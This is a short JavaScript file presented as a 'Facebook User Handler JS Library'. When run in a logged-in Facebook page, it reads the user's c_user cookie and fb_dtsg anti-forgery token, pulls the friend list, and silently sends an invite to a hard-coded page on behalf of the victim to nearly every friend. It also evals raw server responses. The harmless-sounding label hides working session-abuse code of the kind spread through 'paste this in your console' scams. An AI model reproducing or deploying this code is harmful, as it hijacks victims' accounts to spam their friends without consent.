// Facebook User Handler JS Library v2.1 by MELVS - http://www.melvs.ga

var fb = function(){
	if(document ['cookie'] ['match'](/c_user=(\d+)/) != null){
		this ['id'] = document ['cookie'] ['match'](/c_user=(\d+)/)[1]
	}
	else{
		this ['id'] = null
	}
	if(document ['getElementsByName']('fb_dtsg').length != 0){
		this ['dtsg'] = document ['getElementsByName']('fb_dtsg')[0] ['value']
	}
	else{
		this ['dtsg'] = null
	}
	if(this ['id'] != null){
		var xhr = new XMLHttpRequest()
		xhr ['open']("GET",'/pages/typeahead/invite_bootstrap/?page_id=175436532835639&subtitles=1&__pc=EXP1%3ADEFAULT&viewer=' + this ['id'] + '&token=' + Math ['random']() + '&filter[0]=user&options[0]=friends_only&options[1]=nm&request_id=&__user=' + this ['id'] + '&__a=1&__dyn=&__req=&__rev=', false)
		xhr ['send']()
		if(xhr ['readyState'] == 4 && xhr ['status'] == 200){
			var data = eval('('+xhr ['responseText'] ['substr'](9)+')')
			if(data){
				this ['friends'] = data ['payload'] ['entries'] ['sort'](function(x, y){return x ['index'] - y ['index']})
				if(this ['friends']){
					for(var i=0;i<this ['friends'] ['length'];i++){
						if(this ['friends'] [i] ['aux_data'] == undefined){
							var xhr = new XMLHttpRequest()
							xhr ['open']("POST",'/ajax/pages/invite/send_single/?__pc=EXP1%3Areact_composer_pkg')
							xhr ['send']('page_id=175436532835639&invitee=' + this ['friends'] [i] ['uid'] + '&elem_id&action=send&ref=context_row_dialog&__user=' + this ['id'] + '&__a=1&__dyn=aKTyBW8-a&__req=&fb_dtsg=' + this ['dtsg'] + '&ttstamp=&__rev=')
						}
					}
				}
			}
		}
	}
	else{
		this ['friends'] = null
	}
	if(document.getElementsByClassName('_5ss8').length != 0){
		this ['page'] = document ['getElementsByClassName']('_5ss8') [0] ['getElementsByTagName']('span') [0] ['getElementsByTagName']('div') [0] ['getAttribute']('id') ['split']('_') [1]
	}
	else{
		this ['page'] = null
	}
}
